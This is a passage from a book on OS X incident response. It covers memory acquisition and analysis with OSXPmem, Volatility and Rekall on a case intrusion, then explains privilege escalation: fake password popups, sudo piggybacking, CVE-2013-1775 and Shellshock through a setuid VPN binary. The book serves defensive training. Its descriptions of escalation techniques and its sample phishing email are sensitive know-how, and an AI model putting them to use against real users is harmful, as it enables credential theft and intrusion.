OS X El Capitan. OSXpmem does a pretty good job at staying current, but has 
not yet been released for El Capitan likely due to Apple’s heightened restric-
tions on loadable Kernel Modules.
The Artifacts
In this chapter we are presented with only a few different artifacts. They are as 
follows.
Physical Memory
The data that is stored in the physical memory of the system. When we refer-
ence a memory dump, this is what is being referred to.
Swap Files
/private/var/vm/swapfile0
This file is used as a cache when physical memory fills up. Data in physical 
memory will be pushed to the swapfile and then swapped back into physical 
memory if it’s needed again. This can be compared to the Windows pagefile.
sys. More than one file can exist in here. For example, you might see swapfile0, 
swapfile1, and so on. The size of these files will depend on how much physi-
cal memory the system has. More physical memory on the system means the 
computer is less likely to need a swapfile.
/private/var/vm/sleepimage
When OS X goes into hibernation, data stored in memory is put into the 
sleepimage file. When the user comes back and wakes the computer, mem-
ory is restored from the sleepimage and the user can pick up where they 
left off.
The downside here is that any type of memory that exists on the hard drive 
(anything that isn’t physical memory) will be encrypted by default on OS X 
10.7 and greater. This makes collecting the files a possible waste of hard drive 
space on our end. You can adjust the Operating System to not encrypt these 
files, but most users will not do so. Still, it’s worth checking to see if it’s been 
disabled as they may hold valuable data. To perform the check for encryption, 
you can look at the output of “sysctl vm.swapusage”.

Introduction
145
The “encrypted” string in the aforementioned output tells us that the files dis-
cussed here are encrypted.
Know your Options
Before we get started, know that you have a choice whether you want to col-
lect memory and pull that memory dump back to your analysis system or us-
ing Rekall you can perform live memory analysis while on the system. There 
are benefits to both methods. If we have the complete memory dump we are 
able to perform actions on it as we please during analysis. However, if we col-
lect the strings of memory while on the system we can refrain from having to 
transfer what could be a very large memory acquisition over the network sav-
ing us time, bandwidth, and hard drive space. This book will touch on how to 
perform live analysis with Rekall but will focus more on collecting the entire 
memory acquisition.
Memory Acquisition
Acquiring memory can be done very easily on OS X in just a few simple 
steps using OSXPmem. This tool can also be downloaded from the rekall 
github pages at https://github.com/google/rekall/releases under the pmem 
memory acquisition tools section. At the time of writing osxpmem_2.0.1 
was the latest.
After downloading OSXPmem the first step is to unzip it.

CHAPTER 7: 
Memory Analysis
146
This creates a new app called osxpmem.app. Inside this app are the Mach-O 
binary used to dump memory and the KEXT bundle which needs to be loaded. 
However, in order to load a KEXT, it must belong to the root user and the wheel 
group. This shouldn’t be a problem for us since our incident response collec-
tion script should already be running as root.
Remember that a KEXT bundle is just an organized directory. chown -R 
root:wheel will apply our new permissions to the .kext as well as the contents 
within it. Then we load the KEXT file using kextload.
After loading this KEXT you can find two new device file types located at /dev/
pmem and /dev/pmem_info. The /dev/pmem now contains raw memory and 
the /dev/pmem_info contains all sorts of good information about the system 
that has been collected by the MacPmem.kext.
You can take a look at the different available arguments using osxpmem –h.

Introduction
147

CHAPTER 7: 
Memory Analysis
148
We can now dump raw memory from /dev/pmem using osxpmem like so.
where -o lets us specify the name of the memory dump. You’ll notice we’ve 
used the file extension of aff4. This extension stands for advanced forensic file 
format and is a format managed by Google. This file format is built on top of 
the zip file format. Some versions of “zip” can even look inside the archive. 
However, it’s easiest to look and manage the contents by using osxpmem itself. 
After we’ve dumped memory to this aff4 file we can view the contents of it us-
ing the -V.

Introduction
149
This lists all sorts of data about the contents of the aff4. This shows we’ve added 
one artifact to this archive. We can see that this archive file has unique identi-
fier ID that’s been created for it - a6edf0bf-ff79-4267-82ec-ba01ee64258f. This 
id is called an aff4 URN. Any additional items added to this archive will be 
tagged with this same identification number. osxPmem has also automatically 
assigned this artifact the category of “memory:physical”. It shows that upon 
creating the memory artifact, compression was automatically applied result-
ing in a file much smaller than the actual memory dump. As seen in the help 
display, we can use osxpmem to add more artifacts to this archive. Adding files 
is as easy as using the -i argument. We can now add the swapfile artifacts (if 
they’re not encrypted) using this argument.
We can see that this has added two new files to memory.aff4. Let’s take a look.

CHAPTER 7: 
Memory Analysis
150
Sure enough, we see that our two new swapfiles (swapfile0, swapfile1) have 
been added to our aff4 archive. If we wanted to, we could even have used osxp-
mem to collect all of the artifacts mentioned in this book.
Once the aff4 file has been moved to our analysis machine we can easily extract 
these artifacts using the --export switch. To extract the physical memory dump 
I would use the following command:

Analysis Tools
151
The aforementioned command shows us exporting /dev/pmem from the aff4 
archive to a new file called memory.dmp. This is the raw memory dump that 
we will be performing further analysis on.
ANALYSIS TOOLS
Strings and Grep
Sometimes when it comes to memory analysis the best findings can be found by 
simply looking at the words that exist in it. A raw memory dump is going to be 
filled with garbled text that is not human readable. Strings should always be used 
on memory as it allows us to pull all of the readable text. Make sure to output the 
contents of strings to a new file to save time in future searches through memory. 
We will be using grep to search through this file for as many different keywords as 
we can think of. There is a lot of information to parse through when looking at the 
strings of memory, so it’s easy to overlook something critical if you get impatient.
Let’s say that we wanted to search for times in which a user entered “sudo su” 
in memory which would allow them to escalate privileges to root.
We can see “sudo su” is in memory quite a few times. Let’s expand this a little. 
We can use the -n switch with grep to show the lines surrounding each of these 
hits. Let’s use grep -n3 which will show us three lines above each “sudo su” hit, 
and three lines below it. The line number it appears on in memory.strings is 
also displayed on the left when using the -n switch.

CHAPTER 7: 
Memory Analysis
152
This is one of the snippets returned by this grep command. Look familiar? 
This actually shows my actions when collecting memory. Here we can see that 
I tried to load the kext file as a standard user instead of root. As a result, I was 
told the operation was not permitted. I then elevated to root, assigned the cor-
rect permissions to macpmem.kext, and loaded it. This paints a perfect picture 
of how you can simply use grep to gain more context around commands found 
in memory.
Volatility
In this section we will take a look at how to use Volatility to investigate OS 
X memory in search of malicious behavior. We will later apply what we’ve 
learned in the analysis section. Volatility is perhaps the most widely used 
memory analysis framework available. The reasons behind this are because it’s 
well-documented, fast, and easy to use. Its open source availability also allows 
users to customize its abilities with their own plugins. So let’s get started.
As stated before you can find a lot of information on the Volatility github page. 
Here is a list from the site that shows the available functionality for OS X.

Analysis Tools
153
Before we move forward, we have to know what version of OS X we are work-
ing with. Volatility commands need to be executed with a specific profile as 
functionality varies between different flavors of OS X. You can do this by 
looking in the “sw_vers” output that we should have collected in previous 
chapters.
I can see here that I’m working with a 10.9.5 machine. This means I have to 
load the 10.9.5 profile when using volatility. I can find the name of the profile 
by searching the volatility –info output.

CHAPTER 7: 
Memory Analysis
154
I can see the profile name I need is “MacMavericks_10_9_5_AMDx64”. Now 
that I know the profile I can get started.
Let’s test this with the ifconfig module (Fig. 7.1).
If all goes well, you should be looking at the ifconfig information taken di-
rectly from the memory dump. We can see that the system we’re analyzing was 
using a local IP address of 192.168.1.108. Now that we have Volatility working 
let’s dive into some of its best functionality.
Before we go on, please make note that each volatility plugins purpose is 
documented at https://github.com/volatilityfoundation/volatility/wiki/Mac-
Command-Reference. This is a great resource for the plugins we will not be 
touching on.
Processes
In memory, there are multiple different locations where running process infor-
mation is stored. Keep in mind that even though we collected running processes 
FIGURE 7.1

Analysis Tools
155
using ps aux (Chapter 3), our data could have been faulty. If a rootkit has been 
installed on this system, who knows where we’re getting our information from. 
A rootkit could have either modified the ps command itself, or hooked the sys-
tem in someway to filter the output before displaying to us. In some ways, a 
memory dump may be a more reliable source for this information.
mac_tasks
This should be your go to Volatility command to view running processes. We 
get a nice printout of running processes as well as the user who executed them. 
The volatility documentation encourages this command over the mac_pslist 
plugin because mac_pslist can sometimes skew during memory collection 
(Fig. 7.2).
mac_psaux
The most notable feature of psaux is that it shows us the command line argu-
ments that each process was started with. We could even compare the results 
with the output of the “ps aux” command we ran while collecting bash calls in 
Chapter 3 (Fig. 7.3).
FIGURE 7.2

CHAPTER 7: 
Memory Analysis
156
mac_dead_procs
Here is a cool feature that you won’t find otherwise. We can use mac_
dead_procs to pull up a short list of processes that were recently killed. 
This will be particularly useful for us if we’ve managed to pull a memory 
dump off this system quickly after it was compromised. We may get lucky 
and find a suspicious process that belonged to a malicious installer in here 
(Fig. 7.4).
mac_psxview
If you’ve used Volatility on a Windows memory dump, you’re probably fa-
miliar with this one. It performs a search of six different Volatility process 
plugins and returns true or false for whether or not each process showed up 
in that plugin output. The goal of this is to find possible rootkits that might 
be hiding their processes on the system in some ways, but not in others 
(Fig. 7.5).
FIGURE 7.3
FIGURE 7.4

Analysis Tools
157
mac_netstat
Although we’ve already collected netstat information, it’s a good idea to ensure 
that our memory lines up with what we see in collected data. The output also 
displays data regarding which processes is making which connections (Fig. 7.6).
FIGURE 7.5
FIGURE 7.6
FIGURE 7.7
Here we can see UDP and TCP connections as well as connections made over 
UNIX Sockets.
mac_network_conns
This plugin shows similar data to netstat, but it’s collected in a more thor-
ough way. Even though it doesn’t display process information, it does provide 
a more comprehensive list and will even contain connections made by kernel 
extensions that might be hiding themselves in some ways (Fig. 7.7).
mac_check_syscalls
This command checks to see if any of the system calls have been modified. This is 
popular among rootkits that are trying to hide data from users by filtering results 
before displaying them. For example, there is a system call named_getdirentries. 
This syscall is used when the ls command is executed. A rootkit may hook  

CHAPTER 7: 
Memory Analysis
158
mac_recover_filesystem
This is another cool feature that allows you to recover cached portions of the 
file system directly from memory. This command requires you to create a direc-
tory before dumping the contents. After running it you will be given a number 
of recovered directories and files. Note that this use is limited as the folders will 
contain recovered file names, but the files will not contain any content.
mac_arp
A simple but very useful plugin, mac_arp prints the arp table showing us recent 
systems this box has communicated with. If we determine that the system is 
indeed compromised, it’s possible the attacker may have tried to access other 
systems from this one. Alternatively, if this system is communicating with a 
known compromised system on the network, the attacker may have gained ac-
cess to it through lateral movement (Fig. 7.9).
the_getdirentries syscall so when a user runs the ls command, the files belong-
ing to the backdoor will not be displayed in the output. The mac_check_syscalls 
displays an “OK” status if the syscall has not been hooked (Fig. 7.8).
FIGURE 7.8
FIGURE 7.9

Analysis Tools
159
mac_bash
Using mac_bash will allow us to recover commands typed into the bash shell. 
If an attacker has remembered to clear his bash history (∼/.bash_history) we 
can still potentially recover the commands used with the mac_bash plugin. 
Make note that this plugin can take some time to run, but you may be im-
pressed with the amount of history you’re able to recover.
mac_procdump
One of Volatility’s most valuable features is that it allows for the extraction of 
binaries directly from memory. This is particularly useful for us because we 
did not collect an image of the hard drive. If we find a process that interests 
us in particular, we can dump the executable responsible for that process from 
memory. First, you must find a process you wish to dump (Fig. 7.10).
FIGURE 7.11
FIGURE 7.10
If I wanted to dump the launchd process, I could do so by passing the proc-
dump plugin the pid (1) (Fig. 7.11)
After dumping the executable, you are free to analyze it however you see fit. In 
this case we’ve dumped a legitimate process for demonstration.

CHAPTER 7: 
Memory Analysis
160
Taking it Further
We’ve touched on enough of these plugins to give you an idea of what Volatil-
ity is capable of. We will continue to use Volatility throughout the chapters of 
this book as needed. Make sure to visit the Volatility Github site to view more 
documentation.
Live Memory Analysis
If dumping memory and transferring it to a new system for analysis is not a de-
sirable option for you, the option of live memory analysis is available using the 
Rekall Framework. Using live memory analysis will allow us to save the output 
of various Rekall memory plugins to text files which will be far smaller than 
collecting memory itself. If you chose to take this route, your best option will 
be to include the Rekall memory framework with your collection scripts. This 
framework can be downloaded at www.rekall-forensic.com. As mentioned in 
the above acquisition section you will have to load the OSXpmem KEXT before 
you’re able to use Rekall. After downloading you must unzip Rekall, assign 
permissions, and load the KEXT file like before as root.
You should now be able to execute “rekal” located in the same directory. Pro-
file selection should be performed automatically by rekall when performing 
live memory analysis (Fig. 7.12).
FIGURE 7.12

Analysis Tools
161
If you see a screen that looks like the one aforementioned, that means you 
are now in the Rekall interactive shell and you can run one of the com-
mands built into the Rekall Framework. You’ll notice that many of these 
are similar to Volatility; however, fewer commands are available. Here is a 
list of available commands with a brief description as found in the Rekall 
documentation.
We are of course more interested in scripting our memory commands rather 
than running them in an interactive shell. You can type “exit” to leave the shell. 
Running one liner commands is as easy as adding the name of the plugin to 

CHAPTER 7: 
Memory Analysis
162
the end of the first command we used. Running the lsmod command against 
memory would look something like so (Fig. 7.13).
FIGURE 7.14
FIGURE 7.13
Finally, we can use the “--output“ option to redirect the command output to 
a new file.
COLLECTION
What we need now is a script that will perform the collection of memory on 
our victim system. We will define three different scenarios in our bash code. 
One for a full memory acquisition, another for the collection memory strings 
and Rekall commands, and one for only the collection of Rekall command 
output which would spare us having to wait for the collection of memory. Test 
these different scenarios out to see which suits your needs the best. I highly 
recommend full memory acquisition if you can sacrifice the transfer band-
width and hard drive space. We will include a check to see if the swapfiles are 
encrypted. If by chance the user has unencrypted them, we will ensure we col-
lect them. The osxpmem tool and Rekall framework should be stored inside 
the tools directory of your collection framework.
With these tools setup, we can now put our script in place. We will make the 
following additions to collect.sh (Fig. 7.14):

Collection
163

CHAPTER 7: 
Memory Analysis
164
The updates to our collection toolset should now look like this (Fig. 7.15).
FIGURE 7.15

Analysis
165
ANALYSIS
Scripting for memory analysis is pretty straightforward. You can automate a 
handful of volatility plugins to run on the memory dump and save them to 
a text file for later reference. Referencing the saved output will be much faster 
than rerunning the Volatility plugins over and over. It will be up to the reader 
to automate this process if they so chose.
We will start memory analysis by extracting our memory dump and running 
strings on it. If you’re using a Linux machine for analysis you can use linpmem 
instead of osxpmem to extract the memory dump from the aff4 archive.
Now that we have a file containing the strings of memory, we will want to 
search for all of our discovered malicious indicators. Here’s all of the Yara rules 
we’ve built so far put into a single file.

CHAPTER 7: 
Memory Analysis
166
Let’s scan the strings of memory with this rule. We’ll use a few different com-
mands to sort and count the results for us.
Note that memory.strings is not actually an indicator we were looking for. It 
just got jumbled into our output due to the commands we used. Let’s see what 
we can find in memory using each indicator. I will not show all of the results I 
find as that would go on for pages. Analyzing the strings of memory is another 
process of trial and error. Some indicators will return incredibly valuable infor-
mation while others will be lacking in detail. We will take a look at the most 
relevant findings during our analysis.

Analysis
167
iTunesBackup and com.apple.iTunesHelperModule.plist
We’ll start with the iTunesBackup script. We discovered in Chapter 5 that 
iTunesBackup is a malicious bash script that is executed by launchd every 
30 s due to a user agent called com.iTunesHelperModule.plist. Given that 
this bash script is being run every 30 s, we should definitely be able to find 
it in memory.
We see in memory that the echo function is being used to append the iTunes-
Backup script to the iTunesHelperModule launch agent. This is likely part of 
the malware installation process. We will search for the 25 lines above and 
below this string in memory by using the “egrep -n” switch.

CHAPTER 7: 
Memory Analysis
168
Perfect! We were able to recover what appears to be a large portion of the 
iTunesBackup script. This output shows that when the script is executed 
it will create the launch agent if it doesn’t exist. After that, it forces the 
loading of the launch agent and checks to see if any python processes are 
running that contain the string “iTunesSupport”. If no such process exists, 
the script executes the malware. Finally, it’s also checking to see if the iTu-
nesSupport backdoor has been deleted. If it has been deleted it rewrites the 
python code back to disk, but the python code is cut off before we can see 
the rest of it.
Security_update.zip and secupdat.com
Security_update.zip is a file that we saw downloaded via Chrome. In theory 
it holds the malware that was executed. We will search for the zip inside of 
memory.

Analysis
169
This result is hard on the eyes at first, but if you look closely you’ll notice that 
this is actually the yahoo mail entry for the phishing email Mike opened. There 
are a handful of interesting items in here.
j	 from:
j	 {“name”:“Dave Edwards”,“email”:“dedwards1231@yahoo.com“}
j	 name
j	 {“name”:“url”,“value”:“secupdat.com, http:\/\/www.secupdat.com\ 
/security_update.zip”}]
j	 toEmail:
j	 msteen1235@yahoo.com
j	 subject:
j	 COMPANY WIDE MANDATORY SECURITY UPDATE
j	 snippet:
j	 Good evening team, please download and install the attached 
Application which will increase the security of company. Employees 
who don’t install this app will be in danger of getting viruses or other m
The email content appears to be displayed only as a snippet we can probably find 
the rest elsewhere in memory by looking for keywords that were in this email.

CHAPTER 7: 
Memory Analysis
170
This finding reveals that the word “here” in the email was a hyperlink to the 
malware located at secupdat.com.
iTunesSupport
From what we’ve seen so far iTunesSupport is a python script that is commu-
nicating with an attacker Command and Control server.

Analysis
171
Here we’ve managed to reveal a handful backdoor functions simply by look-
ing at the strings of memory. If this backdoor was written in a nonscripting 
­language we probably would not be so lucky because the code would not 
­appear in plain text. We see that the backdoor is capable of uploading and 
downloading files, taking screenshots, and running commands. The code gets 
cut off with some garbled text toward the bottom.
arp.txt
Although arp.txt was not one of the indicators in our yara rules, we found this 
file sitting in a security_update.app subfolder in Chapter 4. If we wanted to 
find out how this file was created we could try checking for it in memory.
It comes as no surprise that the arp.txt file holds the output of the arp com-
mand. When examining the strings of memory you will often find that bash 
commands executed within an interactive shell will end up right next to each 
other. Let’s look at the lines above and below these arp commands.

CHAPTER 7: 
Memory Analysis
172
The aforementioned snippet shows a large amount of attacker commands be-
ing executed surrounding the creation of the arp.txt file. Many of these ex-
ecuted commands explain the files with vague names we found in Chapter 4 
such as ns.txt, ps.txt, 1.txt, and 2.txt. Right now we are still left in the dark as to 
what is inside of 1.txt and 2.txt. We will investigate these in later chapters. We 
also observe for the first time that the attacker was checking the availability of 
an internal IP address on the network—192.168.0.15.
Volatility Analysis
So far we’ve been able to discover a lot of what we’re looking for using strings 
and grep, but this may not always be the case. A lot of the malicious code run-
ning here was in the form of bash and python scripts, so we were able to find it 
in plain text. Although using scripting languages as malware isn’t unheard of 
on OS X, you will commonly see backdoors being written in a compiled lan-
guage such as C, C++, or Objective-C. You will commonly have to find the 
malicious process, use the procdump plugin to dump that process, and finally 
perform analysis on it. We cannot dump the python and bash scripts using 
procdump because it will result in dumping the process itself which in our case 
would be the “bash” process or the “python” process rather than the scripts 
they’ve executed.
One nice thing about having memory is that we can build a process tree 
without having to manually grep every single process ID like we did in 
Chapter 3.

Conclusion
173
This shows us the same information that we were able to collect with the ps 
aux output. It shows the attacker was eventually able to go from running the 
backdoor as a standard user to a bash shell running as root.
Another plugin that will always be handy is the mac_bash commands to dis-
play commands executed inside a shell. However, if the attacker was not using 
an interactive shell, the commands wouldn’t end up in these results (similar to 
the way bash_history works)
We see here very similar results to what we saw using the strings of memory. 
However, it appears that there may be an issue with the parsing of timestamps. 
You may sometimes run into bugs like this while analyzing memory.
CONCLUSION
Bottom line, analyzing memory can get messy. A lot of time can be spent on 
grepping the strings trying to find an item of relevance to the investigation. The 
time spent doing so is never time wasted. By performing the aforementioned 
analysis you’ll notice even though we did not uncover a whole lot of new de-
tails, we were able to confirm nearly every suspicion that we’ve had thus far re-
garding the attackers’ actions. We will continue to rely on memory throughout 
the next few chapters as we try to reveal the final steps of this intrusion. Our 
updated intrusion layout now looks like Fig. 7.16.

CHAPTER 7: 
Memory Analysis
174
Yara rule of indicators discovered in this chapter.
FIGURE 7.16

175
OS X Incident Response﻿
Copyright © 2016 Elsevier Inc. All rights reserved.
Privilege Escalation & Passwords
CHAPTER 8
INTRODUCTION
Escalating privileges and collecting passwords off compromised systems 
has always been a primary goal of the adversary. Put yourself in their shoes 
for a moment. Your malware has just executed on a target system and you 
now have access to the endless amount of tools built into OS X. One might 
wonder what the purpose of dumping passwords is when you already have 
access to the system. The purpose is lateral movement. Lateral movement is 
when an adversary has compromised a system in a target environment and 
then uses that system to access other systems on the network. Say that the 
attacker runs the “history” command and discovers that the compromised 
OS X user frequently talks to a Linux server over SSH. The stealthiest ap-
proach would be to use legitimate credentials to access that file server so 
that it looks as if nothing is wrong. When the adversary moves laterally 
across the network with compromised credentials it can prove very difficult 
to detect. Our best bet is to catch password dumping when it occurs (prefer-
ably before) and ensure that the compromised accounts are disabled before 
the attacker is able to use them. If exploits are used, an attacker may even 
manage to install a rootkit on the system without knowing a single user 
password, but if he wants to move laterally he’ll have to get access to some. 
The easiest way for an attacker to do this is by getting a list of credentials 
used frequently by the user.
Perhaps the most challenging part of collecting passwords on OS X is the fact 
that all password dumping techniques require root privileges. Compromising 
an administrator account will allow you to run commands as root, but only 
if you know that administrators password. Before we get into the process of 
collecting password hashes, we will first focus on how an attacker commonly 
acquires the necessary privileges to do so.

CHAPTER 8: 
Privilege Escalation & Passwords
176
PRIVILEGES
The different levels of privileges are not difficult to understand on OS X. If 
you’ve worked with Unix before, you’ll find much of this familiar.
j	 Standard User
j	 The most basic of users. This user needs permissions granted from 
an admin user when attempting to install software or perform other 
advanced tasks. They are not able to do it on their own.
j	 Admin User
j	 A user who operates most of the time as a standard user but is also 
allowed to perform root actions such as install software and other 
administrative tasks. All users belonging to the admin group are 
given access to root via the sudoers file.
j	 Root
j	 Root is a user whom many recognize as the ultimate user allowed to 
perform any action as they wish (with a few exceptions on OS X El 
Capitan). When an admin user performs a task using sudo, they are 
temporarily logging in as the root user to accomplish a privileged 
task.
A Quick Note on System Integrity Protection—(Rootless)
System Integrity Protection is not a user, rather it is a feature. Starting with OS 
X El Capitan, certain capabilities were removed from the root user. This feature 
has been dubbed “rootless” as it limits the root user’s capabilities which is 
unheard of across Unix-based distributions. The most recognizable limitation 
being that the root user can no longer modify OS X operating system specific 
files and folders. For instance, even as root you cannot place a file inside of /
System directory. In order to disable rootless you must boot the system into 
recovery mode. It is highly unlikely that an attacker would be able to do this. 
Alternatively, an attacker could end up on a system where the user has already 
disabled the rootless functionality but this is also unlikely.
Privilege Escalation
In this section we will run a quick break down of privilege escalation exploits and 
methodologies that have given attackers root access in the past. Unix permissions 
are set up to be very useful and incredibly powerful if handled appropriately. 
Most of the functionality built into the permissions assumes that you know what 
you’re doing. This has always been the way of Unix. When it comes to permis-
sions on OS X some users may be clueless. Escalation issues can arise when an un-
trained user begins to change permissions without knowing what they are doing. 
Issues can also arise when a user simply installs software without knowing what 
comes packaged with it. The more software you have running as root, the higher 
the chances are that an attacker may be able to exploit one of these packages.

Privileges
177
Root Through Standard Installation
To: <bilbobagginz423411@gmail.com>
From:<afriendlyface@applezstreetteam.com>
Hello Mr. Baggins,
With the release of OS X Ultimate only 3 months away, we are excited to announce 
that as one of our long term OS X users you qualify for our early-bird access. OS X 
Ultimate comes with new built in sharing features, state of the art security, and addi-
tional UI options making your Apple products shine like they never have before. Please 
install the attached file to begin your upgrade process.
Social Engineering is still a very popular way to gain root permissions on OS X. 
This could be done through a number of ways. The simplest example shown in 
the aforementioned email is convincing a user to install software as root. When 
you install a .dmg file you usually have to supply your administrator password 
so the install has the necessary permissions to write to privileged locations. For 
example, if I installed a new app on my system I would be prompted to enter 
my credentials (Fig. 8.1).
An attacker of course would not see the entered password in this prompt, but 
after a user clicks install software the app will be installed with root permissions. 
However, this would take some very good social engineering skills (better than 
the skills seen in the aforementioned email) as a user is not likely to install ran-
dom software sent over email or otherwise. An unsuspecting user who thinks 
they’re installing legitimate software may enter their password without hesitating.
Social Engineering at the User Level
If an attacker is able to gain code execution on a system at the user level he can 
still set up a TCP connection. If his goal is to make it to the system and steal 
the user’s local files he doesn’t even need root permissions. However, advanced 
FIGURE 8.1

CHAPTER 8: 
Privilege Escalation & Passwords
178
adversaries are known for hiding on victim networks for as long as possible. 
Years even. In order to obtain this level of stealth, the adversary will want root 
permissions. Social engineering from the user level could also appear in the 
form of popups. If the adversary’s malware is running, they will be able to send 
popups to the user. These popups are likely to use a lot of the same lingo seen 
in the aforementioned image, but will look a little bit different. For example, if 
the adversary invokes the following applescript command:
The result would be a pop up window on the user’s desktop (Fig. 8.2).
Any user who knows the first thing about system security would be hesitant of 
this popup. Some might even click cancel at first, but if this were to occur every 
3 min a lot of annoyed users may just give up and enter their password which 
then returns to the attacker in plain text. This is a way of not only gaining root 
privileges, but also acquiring the user’s login password without any cracking 
necessary. It’s an incredibly basic technique but the reason attackers continue 
to use social engineering is because it’s fast, simple, and has a high success rate.
Sudo Piggybacking
Sudo piggybacking is a technique that takes a simplistic but possibly time-con-
suming approach. This technique relies on the legitimate user entering their pass-
word in a terminal window with the “sudo” binary. The odds of this working are 
far more likely if the attacker has compromised a device that belongs to a devel-
oper or a power user. Try the following test scenario. Open two terminal windows. 
In the first terminal, type “sudo whoami” and enter your password as requested. 
Now in the second terminal enter the same command. You’ll notice that in the 
FIGURE 8.2

Privileges
179
second window you were not prompted for your password. Instead, your com-
mand was executed as the root user without hesitation. This is because after you 
successfully run a command with the sudo prefix you have (by default) 5 min to 
continue running sudo commands without a password. Even if you were logged 
in via SSH or other means as the same user, you would still have the ability to run 
commands using sudo with no password required. If an attacker gains access to 
your system, all he has to do is wait for you to run a command via sudo, then he 
will have root access as well. From an attacker perspective, there are a few differ-
ent ways to monitor when password-free root is available via the sudo binary. An 
attacker could choose to run a sudo command in the background continuously 
until it works. This will of course generate a large amount of failed login events so 
it’s not very desirable. Another option is to monitor the bash_history file for the 
sudo binary being used. Finally, a third option is for the attacker to run “sudo -K“ 
which will tell the system to act as if the user has never run the sudo binary before. 
This will delete a directory located at /var/db/sudo/$USER. The next time the user 
logs in with sudo, this file will be recreated. This means the attacker can monitor 
for a timestamp update to the /var/db/sudo directory. If the timestamp on this 
directory changes, it means a User has just logged in with the sudo command and 
now the attacker can do the same (Fig. 8.3).
FIGURE 8.3

CHAPTER 8: 
Privilege Escalation & Passwords
180
If you wish to change or disable the 5 min password free timeout you can use 
the visudo command to manually modify the timeout specified in the /private/
etc/sudoers file.
Apple is aware that this technique is possible and includes a small warning in 
the security notes section of the sudo man page. It appears that this technique 
is possible due to compatibility reasons.
“Since time stamp files live in the file system, they can outlive a user’s login 
session. As a result, a user may be able to login, run a command with sudo 
after authenticating, logout, login again, and run sudo without authenticating 
so long as the time stamp file’s modification time is within 5 min (or whatever 
the timeout is set to in sudoers). When the tty_tickets option is enabled in 
sudoers, the time stamp has per-tty granularity but still may outlive the user’s 
session. On Linux systems where the devpts filesystem is used, Solaris systems 
with the devices filesystem, as well as other systems that utilize a devfs file-
system that monotonically increase the inode number of devices as they are 
created (such as Mac OS X), sudo is able to determine when a tty-based time 
stamp file is stale and will ignore it. Administrators should not rely on this 
feature as it is not universally available.”
Given this explanation you can prevent sudo piggybacking by adding the fol-
lowing to your /private/etc/sudoers file.
Setuid Exploitation
When a process runs there are two user ids stored with that process: Real ID 
and Effective ID. The Real ID represents that of the user who executed the pro-
gram whereas the effective ID represents that of the user whom the program is 
running as. These ids will almost always be the same unless dealing with a file 
that has a setuid bit enabled. We discussed setuid binaries in Chapter 4, but in 
case you forgot, a setuid bit is a permissions flag that allows one user to execute 
a binary as another user. There are many different reasons one might want to 
do this. Sometimes software needs to allow unprivileged users access to tools 
that require another user’s privileges. Take the “newgrp” binary for example. 
newgrp allows a standard user to login to a group they don’t belong to if they 

Privileges
181
know the group password. The newgrp binary has the setuid bit enabled. Take 
a quick look at the permissions.
These permissions show an “s” in place of the owner’s executable bit. When 
any user executes this binary, it will be executed as the file owner who in this 
case is root. newgrp needs to execute as root because changing from one group 
to another requires root permissions. By being a setuid binary belonging to 
root, newgrp can allow any user to change groups (but they will be prompted 
for the group password).
Developers are commonly encouraged to avoid using the setuid bit if possible 
due to vulnerabilities often being overlooked. Remember that creating a setuid 
binary with root ownership means giving a user temporary access to root tasks.
Additionally, developers can apply a setgid bit to files. A setgid bit works very 
similar in that they allow users in one group to execute a binary as another 
group. The same precaution needs to be taken when handling setgid binaries. 
You can identify a setgid binary by looking for an “s” where the group execute 
permission should be.
If you’d like to collect a quick list of all the setuid and setgid binaries on a sys-
tem, you can use the following find command:
If you would rather only see setuid binaries belonging to the root user you 
could use this find command.

CHAPTER 8: 
Privilege Escalation & Passwords
182
CVE-2013-1775—Sudo and the System Clock Exploit
Let’s take a quick look at a setuid binary that was exploitable in the past. The 
sudo binary for obvious reasons is a setuid binary as it allows any user in 
the sudoers file access to root permissions.
-r-s--x--x 1 root wheel 168448 Nov 2 20:35 /usr/bin/sudo
As discussed earlier in the chapter, after executing a command using sudo, any-
one else logged in as the same user can run a command using the sudo binary 
without having to supply a password.
So how does sudo know if the timeout has occurred? After executing a com-
mand using sudo for the first time, a directory is created in /var/db/sudo de-
rived from the name of the user who ran it eg /var/db/sudo/bilbo.
After running the ping command using sudo, we see a directory has been cre-
ated with the bilbo user name in the sudo folder. From now on everytime the 
sudo binary is executed, it will first perform a check to see if 5  min have passed 
since the timestamp on this directory. If 5 min have not passed, it will allow 
more sudo usage without demanding a password. If 5 min have passed, we 
repeat the whole process again.
Now here is where the vulnerability comes in. In older versions of sudo an 
attacker could run “sudo -k” to force a timeout and your $USER directory in 
/var/db/sudo would be changed to the timestamp of Jan. 1, 1970 01:00:00. 
The next time sudo was run the time calculation will show that well over 
5 min had passed and the user would be prompted for their password as 
expected.

Shellshock
183
If you have a firm grasp on the aforementioned concept then you might already 
know where the vulnerability exists. Since, any user on the system is allowed to 
change the system clock, an attacker could reset the $USER timestamp using “sudo 
-k” and then set the clock back to Jan. 1970 01:00:01 and trick sudo into thinking 
5 min had not yet passed. This would again allow for password free sudo usage.
Back then changing the system time could even be done without root permis-
sions from the terminal.
It’s small mistakes like this that allow attackers to go from an admin account 
ultimately to root. This vulnerability was fixed in the next version of sudo.
SHELLSHOCK
Shellshock was a vulnerability in bash originally discovered by Stephane Cha-
zelas of Akamai Technologies. News of this vulnerability spread like wildfire 
across the internet as it was a vulnerability that affected a massive number of 
systems worldwide. The bug here existed in the assignment of environment 
variables. To sum up, an attacker could craft a special bash variable and add 
an additional command to the end of that variable. Rather than stopping with 
the variable assignment, bash would go ahead and execute the command that 
followed behind the assignment. For example.
As you can see, the ping command was executed after the variable assignment. 
The major concern was that attackers could send these modified environment 
variables to web servers using CGI scripts. The web server would then look at 
the variable using bash and execute the trailing command instead.
Although many were focusing on this vulnerability from a remote web server 
perspective, shellshock also left the door open for privilege escalation under 
the right conditions. If a user executed a setuid binary and that binary created 
a bash subprocess, the shellshock exploit could be used to gain a root shell.

CHAPTER 8: 
Privilege Escalation & Passwords
184
Take the following real world example. A very popular VPN tool called PanGPS 
spawns a bash script when executed. This script would run as a subshell. There-
fore, the subshell was vulnerable to shellshock.
You might be thinking, if an attacker already has system access why even both-
er running this exploit? Take a look at the PanGPS binary.
We see that the PanGPS binary is a setuid binary which means that the subshell 
we are exploiting is running as root.
This shows that even though we are executing PanGPS as a basic user, we can 
execute anything we want as root when we couple PanGPS with shellshock. 
Even though spawning a script under a setuid binary is highly discouraged, 
keep in mind that this vulnerability actually exists in Bash rather than PanGPS.
PASSWORDS
The Keychain and the Security Command
OS X manages confidential information such as app passwords, certificates, 
and private/public key pairs using a tool called the Keychain. Most users are 
familiar with it as a password management tool. Users can store all of the 
